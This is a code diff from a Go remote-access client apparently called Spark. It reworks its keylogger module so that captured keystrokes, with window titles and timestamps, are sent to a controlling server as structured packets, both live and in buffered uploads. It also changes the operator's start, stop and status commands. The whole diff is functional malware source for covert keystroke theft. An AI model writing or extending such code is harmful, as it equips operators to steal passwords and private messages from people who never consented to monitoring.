@@ -3,7 +3,6 @@ package keylogger
 import (
 	"Spark/client/common"
 	"Spark/modules"
-	"Spark/utils"
 	"encoding/json"
 	"sync"
 	"time"
@@ -106,14 +105,14 @@ func (k *Keylogger) AddEvent(event KeyEvent) {
 
 // sendLiveEvent sends a keystroke event immediately via WebSocket
 func (k *Keylogger) sendLiveEvent(event KeyEvent) {
-	data, err := json.Marshal(event)
-	if err != nil {
-		return
-	}
-
 	packet := modules.Packet{
-		Act:  "keylogger_live",
-		Data: string(data),
+		Act: "keylogger_live",
+		Data: map[string]any{
+			"key":       event.Key,
+			"timestamp": event.Timestamp,
+			"window":    event.Window,
+			"type":      event.Type,
+		},
 	}
 
 	k.conn.SendPack(packet)
@@ -132,14 +131,11 @@ func (k *Keylogger) uploadEvents() {
 	k.events = k.events[:0] // Clear the buffer
 	k.eventsMutex.Unlock()
 
-	data, err := json.Marshal(events)
-	if err != nil {
-		return
-	}
-
 	packet := modules.Packet{
-		Act:  "keylogger_upload",
-		Data: string(data),
+		Act: "keylogger_upload",
+		Data: map[string]any{
+			"events": events,
+		},
 	}
 
 	k.conn.SendPack(packet)
@@ -176,43 +172,55 @@ func HandleAction(conn *common.Conn, packet modules.Packet) {
 	switch packet.Act {
 	case "keylogger_start":
 		var config KeyloggerConfig
-		if err := json.Unmarshal([]byte(packet.Data.(string)), &config); err != nil {
-			golog.Error("Keylogger: Failed to parse config: ", err)
-			return
+		// Extract config from packet.Data map
+		if data := packet.Data; data != nil {
+			if mode, ok := data["mode"].(string); ok {
+				config.Mode = mode
+			}
+			if interval, ok := data["offlineInterval"].(float64); ok {
+				config.OfflineInterval = int(interval)
+			}
+			if maxBuffer, ok := data["maxBuffer"].(float64); ok {
+				config.MaxBuffer = int(maxBuffer)
+			}
 		}
 		
 		err := keylogger.Start(config)
 		if err != nil {
 			golog.Error("Keylogger: Failed to start: ", err)
 			conn.SendPack(modules.Packet{
-				Act:  "keylogger_error",
-				Data: err.Error(),
+				Act: "keylogger_error",
+				Data: map[string]any{
+					"error": err.Error(),
+				},
 			})
 			return
 		}
 
 		conn.SendPack(modules.Packet{
-			Act:  "keylogger_started",
-			Data: "Keylogger started successfully",
+			Act: "keylogger_started",
+			Data: map[string]any{
+				"message": "Keylogger started successfully",
+			},
 		})
 
 	case "keylogger_stop":
 		keylogger.Stop()
 		conn.SendPack(modules.Packet{
-			Act:  "keylogger_stopped",
-			Data: "Keylogger stopped successfully",
+			Act: "keylogger_stopped",
+			Data: map[string]any{
+				"message": "Keylogger stopped successfully",
+			},
 		})
 
 	case "keylogger_status":
-		status := map[string]interface{}{
-			"running": keylogger.isRunning,
-			"config":  keylogger.config,
-			"events":  len(keylogger.events),
-		}
-		data, _ := json.Marshal(status)
 		conn.SendPack(modules.Packet{
-			Act:  "keylogger_status",
-			Data: string(data),
+			Act: "keylogger_status",
+			Data: map[string]any{
+				"running": keylogger.isRunning,
+				"config":  keylogger.config,
+				"events":  len(keylogger.events),
+			},
 		})
 	}
 }
